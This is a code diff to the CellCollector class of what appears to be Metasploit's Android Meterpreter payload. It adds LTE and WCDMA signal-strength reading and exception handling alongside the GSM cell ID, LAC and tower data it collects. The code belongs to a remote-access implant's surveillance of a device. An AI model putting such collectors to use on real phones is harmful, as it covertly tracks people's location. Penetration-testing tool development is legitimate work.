@@ -10,8 +10,13 @@ import android.telephony.cdma.CdmaCellLocation;
 import android.telephony.gsm.GsmCellLocation;
 import android.telephony.CellInfoGsm;
 import android.telephony.CellInfoCdma;
+import android.telephony.CellInfoWcdma;
+import android.telephony.CellInfoLte;
 import android.telephony.CellSignalStrengthGsm;
 import android.telephony.CellSignalStrengthCdma;
+import android.telephony.CellSignalStrengthLte;
+import android.telephony.CellSignalStrengthWcdma;
+import android.telephony.CellSignalStrength;
 import android.util.Log;
 
 import android.content.Context;
@@ -26,6 +31,7 @@ import java.io.IOException;
 
 import java.lang.InterruptedException;
 import java.lang.Math;
+import java.lang.ClassCastException;
 
 import com.metasploit.meterpreter.MeterpreterLogger;
 
@@ -252,11 +258,52 @@ public class CellCollector extends IntervalCollector {
 		else if(lTelePhonyManager.getPhoneType() == TelephonyManager.PHONE_TYPE_GSM) {
 			gsmloc = (GsmCellLocation) lTelePhonyManager.getCellLocation();
 			lGsmCellInfo = (List<CellInfoGsm>)(Object)lTelePhonyManager.getAllCellInfo();
-			CellSignalStrengthGsm lObj2		= (CellSignalStrengthGsm)lGsmCellInfo.get(0).getCellSignalStrength();
-			aTelephonyObj.mSignalStrength 	= String.valueOf(lObj2.getDbm());
+
 			aTelephonyObj.mGSMCellInfo.mCid = gsmloc.getCid();
 			aTelephonyObj.mGSMCellInfo.mLac = gsmloc.getLac();
 			aTelephonyObj.mGSMCellInfo.mPsc = gsmloc.getPsc();
+			aTelephonyObj.mCellTowerId = String.valueOf(aTelephonyObj.mGSMCellInfo.mCid);
+			//Object lObj2 = lGsmCellInfo.get(0).getCellSignalStrength();
+
+			try{
+				CellSignalStrengthGsm lObj2		= (CellSignalStrengthGsm)(((List<CellInfoGsm>)(Object)lTelePhonyManager.getAllCellInfo()).get(0).getCellSignalStrength());	
+				if(lObj2 != null) {
+					aTelephonyObj.mSignalStrength 	= String.valueOf(lObj2.getDbm());
+					mMeterpreterLogger.d(" GSM Device "," --");		
+				}	
+			}
+			catch (ClassCastException castException) {
+				mMeterpreterLogger.d("Not a GSM Device "," --");			
+				castException.printStackTrace();
+			}
+
+			try{
+				//CellInfoLte
+				CellSignalStrengthLte lObj2		= (CellSignalStrengthLte)(((List<CellInfoLte>)(Object)lTelePhonyManager.getAllCellInfo()).get(0).getCellSignalStrength());
+				if(lObj2 != null) {
+					aTelephonyObj.mSignalStrength 	= String.valueOf(lObj2.getDbm());
+					mMeterpreterLogger.d(" LTE Device "," --");			
+				}
+
+			}
+			catch (ClassCastException castException) {
+				mMeterpreterLogger.d("Not a LTE Device "," --");			
+				castException.printStackTrace();
+			}
+
+			try{
+				//CellInfoWcdma
+				CellSignalStrengthWcdma lObj2		= (CellSignalStrengthWcdma)(((List<CellInfoWcdma>)(Object)lTelePhonyManager.getAllCellInfo()).get(0).getCellSignalStrength());
+				if(lObj2 != null) {
+					aTelephonyObj.mSignalStrength 	= String.valueOf(lObj2.getDbm());
+					mMeterpreterLogger.d( " WCDMA Device "," --");			
+				}
+
+			}
+			catch (ClassCastException castException) {
+				mMeterpreterLogger.d("Not a WCDMA Device "," --");			
+				castException.printStackTrace();				
+			}
 
 		}
 
